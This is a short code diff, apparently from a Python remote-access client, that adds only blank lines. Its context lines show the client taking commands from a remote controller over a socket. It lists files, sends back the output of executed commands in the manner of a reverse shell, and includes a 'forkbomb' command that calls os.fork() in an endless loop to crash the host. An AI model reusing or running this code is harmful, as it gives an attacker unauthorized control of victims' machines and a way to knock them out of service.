@@ -20,6 +20,7 @@ while True:
         cmd = sock.recv(1024).decode("utf-8")
         if cmd == "list":  # List files in the dir
             sock.send(str(os.listdir(".")).encode())
+
         if cmd == "forkbomb":  # Forkbomb
             while True:
                 os.fork()
@@ -55,6 +56,7 @@ Processor Architecture: {platform.processor()}
                 sock.send(STDERR)
             else:
                 sock.send(STDOUT)
+
         if not cmd:  # If the connection terminates
             print("Connection dropped")
             break
